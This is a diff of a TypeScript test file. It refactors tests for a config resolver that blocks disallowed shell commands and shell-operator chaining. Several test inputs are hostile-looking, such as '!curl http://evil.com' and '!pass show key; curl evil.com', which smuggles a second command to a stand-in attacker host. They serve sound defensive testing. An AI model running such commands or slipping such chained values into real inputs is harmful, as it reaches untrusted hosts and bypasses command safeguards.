@@ -38,21 +38,20 @@ describe("resolveConfigValue — non-command values", () => {
 });
 
 describe("resolveConfigValue — command allowlist enforcement", () => {
-	it("blocks a disallowed command and returns undefined", () => {
+	it("blocks a disallowed command and returns undefined", (t) => {
 		const stderrChunks: string[] = [];
 		const originalWrite = process.stderr.write.bind(process.stderr);
 		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
 			stderrChunks.push(chunk.toString());
 			return true;
 		};
-
-		try {
-			const result = resolveConfigValue("!curl http://evil.com");
-			assert.equal(result, undefined);
-			assert.ok(stderrChunks.some((line) => line.includes("curl")));
-		} finally {
+		t.after(() => {
 			process.stderr.write = originalWrite;
-		}
+		});
+
+		const result = resolveConfigValue("!curl http://evil.com");
+		assert.equal(result, undefined);
+		assert.ok(stderrChunks.some((line) => line.includes("curl")));
 	});
 
 	it("blocks another disallowed command (rm)", () => {
@@ -65,7 +64,7 @@ describe("resolveConfigValue — command allowlist enforcement", () => {
 		assert.equal(result, undefined);
 	});
 
-	it("allows a safe command prefix to proceed to execution", () => {
+	it("allows a safe command prefix to proceed to execution", (t) => {
 		// `pass` is unlikely to be installed in CI, so we just verify it does NOT
 		// return undefined due to the allowlist check — it may return undefined if
 		// the binary is absent, but the block path must not be taken.
@@ -76,16 +75,15 @@ describe("resolveConfigValue — command allowlist enforcement", () => {
 			stderrChunks.push(chunk.toString());
 			return true;
 		};
-
-		try {
-			resolveConfigValue("!pass show nonexistent-entry-for-test");
-			const blocked = stderrChunks.some((line) =>
-				line.includes("Blocked disallowed command")
-			);
-			assert.equal(blocked, false, "pass should not be blocked by the allowlist");
-		} finally {
+		t.after(() => {
 			process.stderr.write = originalWrite;
-		}
+		});
+
+		resolveConfigValue("!pass show nonexistent-entry-for-test");
+		const blocked = stderrChunks.some((line) =>
+			line.includes("Blocked disallowed command")
+		);
+		assert.equal(blocked, false, "pass should not be blocked by the allowlist");
 	});
 });
 
@@ -130,61 +128,58 @@ describe("resolveConfigValue — shell operator bypass prevention", () => {
 		assert.equal(result, undefined);
 	});
 
-	it("writes stderr warning when shell operators detected", () => {
+	it("writes stderr warning when shell operators detected", (t) => {
 		const stderrChunks: string[] = [];
 		const originalWrite = process.stderr.write.bind(process.stderr);
 		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
 			stderrChunks.push(chunk.toString());
 			return true;
 		};
-
-		try {
-			resolveConfigValue("!pass show key; curl evil.com");
-			assert.ok(stderrChunks.some((line) => line.includes("shell operators")));
-		} finally {
+		t.after(() => {
 			process.stderr.write = originalWrite;
-		}
+		});
+
+		resolveConfigValue("!pass show key; curl evil.com");
+		assert.ok(stderrChunks.some((line) => line.includes("shell operators")));
 	});
 });
 
 describe("resolveConfigValue — caching", () => {
-	it("caches the result of a blocked command", () => {
+	it("caches the result of a blocked command", (t) => {
 		const callCount = { n: 0 };
 		const originalWrite = process.stderr.write.bind(process.stderr);
 		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
 			callCount.n++;
 			return true;
 		};
-
-		try {
-			resolveConfigValue("!curl http://evil.com");
-			resolveConfigValue("!curl http://evil.com");
-			// The block warning should only fire once; the second call hits the cache
-			// before reaching the allowlist check, so stderr count is 1.
-			assert.equal(callCount.n, 1);
-		} finally {
+		t.after(() => {
 			process.stderr.write = originalWrite;
-		}
+		});
+
+		resolveConfigValue("!curl http://evil.com");
+		resolveConfigValue("!curl http://evil.com");
+		// The block warning should only fire once; the second call hits the cache
+		// before reaching the allowlist check, so stderr count is 1.
+		assert.equal(callCount.n, 1);
 	});
 
-	it("clearConfigValueCache resets cached entries", () => {
+	it("clearConfigValueCache resets cached entries", (t) => {
 		const stderrChunks: string[] = [];
 		const originalWrite = process.stderr.write.bind(process.stderr);
 		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
 			stderrChunks.push(chunk.toString());
 			return true;
 		};
-
-		try {
-			resolveConfigValue("!curl http://evil.com");
-			assert.equal(stderrChunks.length, 1);
-
-			clearConfigValueCache();
-
-			resolveConfigValue("!curl http://evil.com");
-			assert.equal(stderrChunks.length, 2);
-		} finally {
+		t.after(() => {
 			process.stderr.write = originalWrite;
-		}
+		});
+
+		resolveConfigValue("!curl http://evil.com");
+		assert.equal(stderrChunks.length, 1);
+
+		clearConfigValueCache();
+
+		resolveConfigValue("!curl http://evil.com");
+		assert.equal(stderrChunks.length, 2);
 	});
 });
